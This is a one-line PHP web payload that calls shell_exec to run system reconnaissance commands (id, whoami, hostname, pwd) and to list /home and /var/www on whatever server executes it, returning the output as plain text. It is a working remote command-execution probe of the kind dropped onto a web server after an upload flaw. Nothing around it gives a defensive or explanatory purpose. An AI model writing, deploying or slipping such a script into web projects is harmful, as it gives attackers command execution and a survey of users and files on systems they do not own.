<?php header('Content-Type: text/plain'); echo shell_exec('id; whoami; hostname; pwd; ls -la /home 2>/dev/null; ls -la /var/www 2>/dev/null | head -20');
